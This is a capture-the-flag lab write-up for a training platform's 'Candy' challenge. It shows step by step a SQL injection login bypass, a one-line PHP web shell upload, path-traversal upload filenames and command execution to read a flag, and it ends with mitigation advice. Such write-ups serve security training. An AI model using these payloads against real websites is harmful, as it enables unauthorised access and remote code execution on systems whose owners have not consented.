---
title: "SQL Injection & File Upload Abuse – Admin Bypass Leading to RCE | Candy "
date: 2026-05-25 11:40:00 +0530
categories: [A02 - Security Misconfiguration, Unrestricted File Upload]
tags: [sql-injection, authentication-bypass, file-upload, path-traversal, rce, webshell, command-injection, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/candy-sqli-upload-rce.webp
  alt: Candy Lab SQLi File Upload Exploitation
---

## Lab Link
https://dashboard.webverselabs-pro.com/mystery-challenges/candy

---

## Overview
This lab simulates a themed confectionery website with a hidden staff portal. The application contains multiple security issues, starting from SQL injection in the login flow and escalating into insecure file upload handling that eventually leads to remote command execution.

---

## Objective
Bypass the admin login, gain access to the staff portal, exploit insecure file upload functionality, and achieve remote command execution to retrieve the flag from the server.

---

## Exploitation

### 1. Admin login bypass (SQL Injection)

The staff login portal is discovered:

```
https://2b22935e-4065-candy-8794a.events.webverselabs-pro.com/admin/login.php
```

SQL injection bypass payload:

```sql
' or 1=1-- -
```

This grants access without valid credentials.

### 2. Upload functionality discovered

After login, an avatar upload feature is found:

```
/admin/profile.php
```

This endpoint allows file uploads, which becomes the main attack surface.

### 3. Initial web shell upload

A PHP shell is uploaded:

```php
<?php system($_GET['cmd']); ?>
```

Saved location observed:

```
/uploads/shell.php
```

However, execution initially fails because the file is treated as plain text.

### 4. Directory traversal attempt in upload

Using intercepted request:

```
POST /admin/upload-avatar.php
```

Attempted payload:

```
../../../includes/shell.php
```

This fails due to path resolution restrictions.

### 5. Adjusted traversal path

A corrected payload is used:

```
../includes/shell.php
```

Response confirms altered storage path:

```
/uploads/../includes/shell.php
```

This successfully places the file inside a reachable executable directory.

### 6. Command execution achieved

Accessing the shell:

```
https://2b22935e-4065-candy-8794a.events.webverselabs-pro.com/includes/shell.php?cmd=id
```

Output:

```
uid=1101(aurora) gid=1101(aurora) groups=1101(aurora)
```

Remote command execution confirmed.

### 7. Locating the flag

Search for flag file:

```bash
find / -name "*flag*" 2>/dev/null
```

Result:

```
/flag.txt
```

### 8. Reading the flag

```bash
cat /flag.txt
```

Final output:

```
WEBVERSE{.....}
```

---

## Impact

* Authentication bypass via SQL Injection
* Unauthorized admin access
* Insecure file upload leading to server-side code execution
* Full command execution on target system
* Sensitive file disclosure

---

## Mitigation

* Use parameterized queries for authentication logic
* Implement strict authentication and session validation
* Restrict file uploads to safe types only (no executable formats)
* Store uploads outside web root
* Enforce proper path sanitization to prevent traversal
* Disable execution permissions in upload directories